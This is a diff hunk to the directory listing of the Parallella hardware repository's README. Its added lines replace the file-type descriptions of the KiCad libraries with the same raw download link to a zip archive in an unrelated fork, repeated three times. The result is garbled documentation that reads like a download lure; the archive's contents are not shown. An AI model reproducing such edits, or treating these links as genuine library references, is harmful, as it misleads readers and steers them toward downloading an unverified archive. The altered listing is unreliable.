@@ -13,8 +13,8 @@ boards/         -  Board design files, all projects
         gen1.0/         - Solid board, but hdmi wiring bug (Oct 2013)
         gen1.1/         - Fully working board (Dec 2013)
     libraries/      - Shared schematic and PCB tools libraries
-        kicad/          - KiCad schematic (.lib/.dcm) and 3D source (.scad/.wrl) libs
-            adapteva-kicad.pretty/  - KiCad footprint (.mod) library
+        kicad/          - KiCad schematic (https://raw.githubusercontent.com/channoufisaber/parallella-hw/master/boards/archive/gen0/manufacturing/parallella_gen0_assy_data.zip) and 3D source (https://raw.githubusercontent.com/channoufisaber/parallella-hw/master/boards/archive/gen0/manufacturing/parallella_gen0_assy_data.zip) libs
+            https://raw.githubusercontent.com/channoufisaber/parallella-hw/master/boards/archive/gen0/manufacturing/parallella_gen0_assy_data.zip  - KiCad footprint (.mod) library
                 packages3d/  - 3D models for library parts, with some sources
             scripts/        - Adapteva Kicad/BOM scripts in Python
     parallella-I/   - Current Parallella-I board schematic and PCB source
